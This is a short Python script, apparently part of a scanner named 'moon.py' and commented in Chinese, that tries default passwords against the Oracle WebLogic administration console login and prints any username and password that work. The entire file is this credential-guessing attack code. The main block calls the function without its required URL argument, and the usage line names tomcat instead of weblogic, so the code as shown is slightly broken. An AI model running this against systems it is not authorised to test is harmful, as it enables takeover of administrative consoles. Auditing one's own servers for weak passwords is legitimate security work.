# -*- coding: utf-8 -*-
import requests

'''
Usage:
    moon.py -u  tomcat http://127.0.0.1:8080
    爆破weblogic用户名账户密码。
'''

def attack(URL):
    print('[+]开始检测-weblogic-weak_pawsswd漏洞。[+]')

    #设定用于爆破的账户密码
    accounts = ['weblogic']
    passwds = ['Oracle@123','weblogic','password','weblogic1']
    for account in accounts:
        for passwd in passwds:
            url = URL + '/console/j_security_check'
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
            headers = {"User-Agent": user_agent}
            data = {'j_username':account,'j_password':passwd,'j_character_encoding':'UTF-8'}
            try:
                r = requests.post(url,headers=headers,data=data, verify=False)
                if 'Oracle WebLogic Server Administration Console' in r.text:
                    pass
                elif 'Home Page - base_domain - WLS Console' in r.text:
                    print('登录页面'+url)
                    print('[+]发现弱口令:'+account+' '+passwd)
                else:
                    print('[-]')
            except:
                print('[-]访问weblogic登录页面出错.')
    print('[+]检测结束-weblogic-weak_pawsswd漏洞。[+]')
    print('\n')

if __name__ == "__main__":
    attack()